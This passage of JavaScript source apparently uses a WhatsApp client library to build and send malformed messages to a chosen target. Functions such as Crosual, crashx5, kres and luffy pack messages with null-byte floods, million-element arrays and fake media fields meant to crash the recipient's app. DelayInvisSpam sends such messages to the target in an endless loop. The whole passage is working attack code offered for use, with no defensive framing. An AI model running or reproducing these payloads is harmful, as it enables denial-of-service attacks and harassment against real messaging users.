                    }
                  ]
                }
              }
            ],
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
            }
          }
        }
      }
    }, {});
  } catch (e) {
    console.log(e);
  }
}

async function groupStatusMessageV2(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [
                            {
                                messageType: 2,
                                messageText: "x".repeat(10000)
                            }
                        ],
                        unifiedResponse: {
                            data: Buffer.alloc(10000).toString("hex")
                        }
                    },
                    pollCreationMessage: {
                        name: " ! - ⧼ - @Koax. Tzy ",
                        options: [
                            { optionName: "4" },
                            { optionName: "" }
                        ],
                        selectableOptionsCount: 1,
                        pollType: "QUIZ",
                        correctAnswer: { optionName: "#" },
                        contextInfo: {
                            externalAdReply: {
                                title: "👁‍🗨⃟꙰。⃝ ⌁ ꪸ⃟‼️",
                                body: "𑇂𑆵𑆴𑆿".repeat(30000),
                                mediaType: 1,
                                sourceUrl: "KoaxTzy",
                                thumbnailUrl: "Nuw",
                                renderLargerThumbnail: true,
                                showAdAttribution: false
                            },
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "68827778@newsletter",
                                newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
                                serverMessageId: 7205
                            },
                            isForwarded: true,
                            forwardingScore: 999,
                            alwaysShowAdAttribution: false
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
        console.log(`✅ GroupStatusMessageV2 sent to ${target}`);
        return true;
        
    } catch (error) {
        console.error(`❌ GroupStatusMessageV2 error: ${error.message}`);
        return false;
    }
}

// FUNC BIASA

async function Crosual(sock, target) { const z = (s) => "\x00".repeat(s); const overflow = (s) => "饝噦饝喌饝喆饝喛".repeat(s); const randomId = () => Math.random().toString(36).substring(2, 15); const randomJid = () => `628${Math.floor(Math.random() * 900000000 + 100000000)}@s.whatsapp.net`; await sock.relayMessage(target, { groupStatusMessageV2: { message: { interactiveMessage: { body: { text: "\u0000" }, nativeFlowMessage: { buttons: "\u0000".repeat(500000) } } } } }, { participant: { jid: target } }); const msg = { groupStatusMessageV2: { message: { interactiveMessage: { header: { documentMessage: { url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true", mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", fileLength: "9999999999999", pageCount: 9999999999999, mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", fileName: "QxZ.png", fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0", mediaKeyTimestamp: "1726867151", contactVcard: true, jpegThumbnail: "" }, hasMediaAttachment: true }, body: { text: "ExploredMessage" }, nativeFlowMessage: { buttons: [{ name: "payment_info", buttonParamsJson: JSON.stringify({ currency: "IDR", total_amount: { value: 0, offset: 100 }, reference_id: `${Date.now()}`, type: "physical-goods", order: { status: "pending", subtotal: { value: 0, offset: 100 }, order_type: "ORDER", items: [{ name: "QxZ.pdf".repeat(5000), amount: { value: 0, offset: 100 }, quantity: 0, sale_amount: { value: 0, offset: 100 } }] }, payment_settings: [{ type: "pix_static_code", pix_static_code: { merchant_name: "Hells", key: z(900000), key_type: "CPF" } }], share_payment_status: false }) }, { name: "call_permission_request", buttonParamsJson: z(950000) }, { name: "url_track_map", buttonParamsJson: JSON.stringify({ url: "https://track.GhostQwertys.com/crash", track_id: z(50000), location: { lat: -999999999, lng: 99999999999 }, timestamp: Date.now() }) }, { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "t.me/QxZ", url: "https://GhostQwertys.com/crash", merchant_url: "https://GhostQwertys.com" }) }, { name: "single_select", buttonParamsJson: JSON.stringify({ title: "t.me/GhostQwertys", sections: [{ title: "Exploit Options", rows: Array.from({ length: 100 }, (_, i) => ({ id: z(5000) + i, title: z(10000) })) }] }) }] }, contextInfo: { remoteJid: target, participant: target, statusQuestion: true, stanzaId: "Hahah" + Date.now() + "-" + randomId() + z(50000), mentionedJid: ["0@s.whatsapp.app", ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")], locationMessage: { degreesLatitude: -999999999, degreesLongitude: 99999999999, name: "Bokep", address: z(50000), jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIhMhMiQWH/2gAMAwEAAhEDEQT/ADBiulKnbXdAzPfkdpOUoy24YxvFS8ZD5H7MJ1//Z" }, order_status: { status: "pending", order_id: z(50000), transaction_id: z(50000), total_amount: { value: 0, offset: 999999 }, currency: "IDR", payment_method: "pix", timestamp: Date.now(), items: Array.from({ length: 500 }, () => ({ name: z(50000), quantity: 999999, price: { value: 0, offset: 999999 } })), customer: { name: z(50000), email: z(50000), phone: z(50000) }, shipping: { address: z(50000), city: z(50000), country: z(50000), status: z(50000) } }, quotedMessage: { documentMessage: { url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true", mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", fileLength: "9999999999999", pageCount: 9999999999999, mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", fileName: "crosual.html", fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0", mediaKeyTimestamp: "1726867151", contactVcard: true, jpegThumbnail: "" } } } } }, jpegThumbnail: z(100000), inviteExpiration: 9999999999 } }; const contextInfo = { remoteJid: Math.random().toString(36) + z(1000), isForwarded: true, forwardingScore: 9999, statusAttributionType: 2, statusQuestion: true, entryPointConversionDelaySeconds: 999999, entryPointConversionApp: "whatsapp", entryPointConversionSource: "call_permission_request", statusAttributions: Array.from({ length: 25000 }, (_, n) => ({ participant: `62${n + 836598}@s.whatsapp.net`, type: 1 })) }; const additionalNodes = [{ tag: "meta", attrs: { status_setting: "contacts" }, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: [] }] }] }]; await sock.relayMessage("status@broadcast", msg, { statusJidList: [target], participant: { jid: target }, additionalNodes: additionalNodes, ...contextInfo }); await sock.relayMessage(target, { statusMentionMessage: { message: { protocolMessage: { key: { remoteJid: target, fromMe: true, id: null }, type: 25 }, additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "false", statusQuestion: "true" }, content: undefined }] } } }, {}); await sock.relayMessage(target, { groupStatusMessageV2: { message: { interactiveResponseMessage: { body: { text: "QxZ Here", format: "DEFAULT" }, nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: z(900000), version: 3 }, contextInfo: { statusQuestion: true, stanzaId: "new-response-" + Date.now() + z(50000), entryPointConversionDelaySeconds: 999999, entryPointConversionApp: "whatsapp", entryPointConversionSource: "non_contact", order_status: { status: "pending", order_id: z(50000), transaction_id: z(50000), total_amount: { value: 0, offset: 999999 }, currency: "IDR", payment_method: "pix", timestamp: Date.now() } } } } } }, { participant: { jid: target } }); const QxZ = { interactiveMessage: { body: { text: "GhostQwertys" }, nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) } } }; await sock.relayMessage(target, { groupStatusMessageV2: { message: QxZ } }, { participant: { jid: target } }); const viewOnceMsg = { viewOnceMessage: { message: { interactiveMessage: { body: { text: "Hello" }, nativeFlowMessage: { buttons: [{ name: "booking_status", buttonParamsJson: JSON.stringify({ display_text: "軎�".repeat(50000), phone_number: "00000000000000" }) }], version: 3 } } } } }; await sock.relayMessage(target, viewOnceMsg, { participant: { jid: target } }); console.log("Function Sended", target); return { success: true, target }; }


async function crashx5(sock, target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    caption: "../xuozif",
                    timestamp: -1, 
                    invisible: true,
                    duration: -1,
                    participant: target,
                    contextInfo: {
                        stanzaId: "null" + Date.now(),
                        participant: target,
                        remoteJid: target,
                        isSystemMessage: true,
                        silent: true,
                        invalidField: Buffer.alloc(1024).toString("hex"),
                        overflowArray: Array(10000).fill("x"),
                        nullField: null,
                        undefinedField: undefined,
                        nestedMalformed: {
                            deep: { extra: "x".repeat(5000) }
                        }
                    }
                },
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 2,
                            messageText: "x".repeat(10000)
                        }
                    ],
                    unifiedResponse: {
                        data: Buffer.alloc(10000).toString("hex")
                    }
                }
            }
        }
    }, {});
}

async function kres(sock, target) {
  try {
    const xuozif = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 9999999999999999,
                height: 9999999999999999,
                width: 9999999999999999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "../xuozif",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              }
            },
            body: {
              text: "../xuozif"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 1000000 }, () => ({
                name: "x".repeat(500),
                buttonParamsJson: JSON.stringify({
                  booking_id: "x".repeat(500),
                  status: "x".repeat(500),
                  business_name: "x".repeat(500),
                  service_name: "x".repeat(500),
                  appointment_time: new Date().toISOString(),
                  customer: {
                    name: "x".repeat(500),
                    phone: "x".repeat(500)
                  }
                })
              }))
            }
          }
        }
      }
    };
    const msg = await generateWAMessageFromContent(target, xuozif, {});
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });
    const rtrfunc = {
      groupStatusMessageV2: {
        message: {
          stickerPackMessage: {
            stickerPackId: "\u0000".repeat(9999),
            name: "../xuozif".repeat(500),
            publisher: "\u0000".repeat(9999),
            fileLength: 9999999999999999,
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            contextInfo: {
              statusAttributionType: 2,
              statusAttributions: Array.from({ length: 1000000 }, () => ({
                type: 1,
                data: {
                  a: "x".repeat(500),
                  b: "x".repeat(500),
                  c: {
                    d: "x".repeat(500),
                    e: "x".repeat(500)
                  }
                }
              }))
            }
          }
        }
      }
    };
    await sock.relayMessage(target, rtrfunc, {
      participant: { jid: target }
    });

  } catch (err) {
    console.error("Error:", err.message);
  }
}

async function DelayInvisSpam(sock, target) {
  while (true) {
    try {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              contextInfo: {
                urlTrackingMap: {
                  urlTrackingMapElements: Array.from({ length: 500000 }, (_, z) => ({
                    participant: `62${z + 720599}@s.whatsapp.net`
                  }))
                }
              }
            }
          }
        }
      }, {
        participant: { jid: target }
      });

    } catch (e) {}
  }
}

async function luffy(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0000".repeat(60000),
                            format: "DEFAULT"
                        },
                        nativeFlowMessage: {
                            buttons: "search_interval_message".repeat(20000) + "\u200B".repeat(30000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {
            participant: { jid: target }
        });
    } catch (err) {
        console.error("Error:", err);
    }
}
